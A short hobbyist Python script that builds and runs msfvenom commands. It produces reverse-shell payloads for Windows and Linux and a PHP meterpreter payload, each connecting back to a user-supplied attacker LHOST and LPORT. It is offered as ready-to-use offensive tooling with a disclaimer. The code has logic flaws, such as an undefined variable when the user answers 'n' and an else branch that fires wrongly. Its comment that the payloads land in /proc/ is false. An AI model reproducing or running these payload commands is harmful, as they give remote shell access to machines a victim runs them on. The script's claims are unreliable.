# this script generates metasploit payloads without you having to remember all the msfvenom commands
# doesn't allow for obfuscation or any fancy stuff like that, just raw payloads
# first time coding something somewhat useful in python, this may come in handy if you're short on time and you need a payload asap
# note - all payloads can be found in the /proc/ folder in the file system, just search for whatever you named it as
# im not responsible for anything you do with this program and i don't condone any illegal activity
# - papa.

import os

os.system("clear")
print("Welcome to the payload generator.")
confirm = input("In order to continue, you must have metasploit installed. Do you have metasploit? y/n ")
if confirm == "y":
    os1 = input("""
    Very well. Which payload would you like? 1,2,3,4
    
    1. Windows
    2. Linux
    3. PHP        """)
if confirm == "n":
    print("You need metasploit installed. Exiting.")
if os1 == "1":
    lhost = input("Enter your LHOST: ")
    lport = input("Enter your LPORT: ")
    filename = input("Enter the name you would like to give your payload:  ")
    output = "msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe" % (lhost, lport, filename)
    os.system(output)
if os1 == "2":
    lhostlinux = input("Enter your LHOST: ")
    lportlinux = input("Enter your LPORT: ")
    filenamelinux = input("Enter your file name: ")
    outputlinux = "msfvenom -p linux/x86/shell/reverse_tcp LHOST=%s LPORT=%s -f elf > %s.elf" % (lhostlinux, lportlinux, filenamelinux)
    os.system(outputlinux)
if os1 == "3":
    lhostphp = input("Enter your LHOST: ")
    lportphp = input("Enter your LPORT: ")
    filenamephp = input("Enter your file name:  ")
    outputphp = "msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw > %s.php" % (lhostphp, lportphp, filenamephp)
    os.system(outputphp)
else:
    print("bruh go get your eyes checked out")
    # haha funne ^
